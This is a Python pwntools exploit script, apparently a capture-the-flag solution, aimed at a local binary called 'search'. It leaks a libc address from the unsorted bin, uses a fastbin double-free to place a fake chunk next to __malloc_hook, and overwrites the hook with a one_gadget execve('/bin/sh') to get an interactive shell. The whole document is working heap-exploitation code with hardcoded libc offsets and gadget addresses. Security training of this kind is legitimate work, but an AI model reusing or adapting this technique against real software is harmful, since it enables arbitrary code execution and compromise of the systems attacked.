#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
from pwn import * 
context(log_level='debug',os='linux',arch='amd64')

p = process("./search")
elf = ELF("./search")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def search(word):
	p.recvuntil('3: Quit\n',timeout=3)
	p.sendline('1')
	p.recvuntil('Enter the word size:\n')
	p.sendline(str(len(word)))
	p.recvuntil('Enter the word:\n')
	p.send(word)


def Index(word):
	p.recvuntil('3: Quit\n',timeout=3)
	p.sendline('2')
	p.recvuntil('Enter the sentence size:\n')
	p.sendline(str(len(word)))
	p.recvuntil('Enter the sentence:\n')
	p.send(word)


def exp():
	Index(' m '.rjust(0x88,'a'))
	search('m')
	p.recvuntil('Delete this sentence (y/n)?\n')
	p.sendline('y')
	search('\x00')
	p.recvuntil('Found 136: ')
	unsortbin_addr = u64(p.recv(6).ljust(8,'\x00'))
	log.info("unsortbin_addr:" + hex(unsortbin_addr))


	libc_base = unsortbin_addr - 0x3c4b78
	system = libc_base + libc.sym['system']
	str_binsh = libc_base + libc.search('/bin/sh').next()
	malloc_hook = libc_base + libc.sym['__malloc_hook']
	log.info('libc_base:'+hex(libc_base))
	log.info("system:"+hex(system))
	log.info("str_binsh:"+hex(str_binsh))
	log.info("malloc_hook:"+hex(malloc_hook))


	p.sendline('n')

	Index(' s '.rjust(0x68,'a'))
	Index(' k '.rjust(0x68,'a'))
	Index(' y '.rjust(0x68,'a'))

	search('s')
	p.recvuntil("Found")
	p.sendline('y')
	search('k')
	p.recvuntil("Found")
	p.sendline('y')
	search('y')
	p.recvuntil("Found")
	p.sendline('y')
	search('\x00')
	p.recvuntil("Found")
	p.sendline('n')
	p.recvuntil("Found")
	p.sendline('y')

	fakechunk_addr = malloc_hook - 0x23
	Index(p64(fakechunk_addr).ljust(0x68,'b'))
	Index(' s '.rjust(0x68,'b'))
	Index(' k '.rjust(0x68,'b'))


	'''
	0x45226 execve("/bin/sh", rsp+0x30, environ)
	constraints:
	  rax == NULL

	0x4527a execve("/bin/sh", rsp+0x30, environ)
	constraints:
	  [rsp+0x30] == NULL

	0xf0364 execve("/bin/sh", rsp+0x50, environ)
	constraints:
	  [rsp+0x50] == NULL

	0xf1207 execve("/bin/sh", rsp+0x70, environ)
	constraints:
	  [rsp+0x70] == NULL
	'''
	# gdb.attach(p)
	Index(p64(0xf1207+libc_base).rjust(0x1b,'a').ljust(0x68,'b'))




	# gdb.attach(p)
	p.interactive()
	
if __name__ == '__main__':
	exp()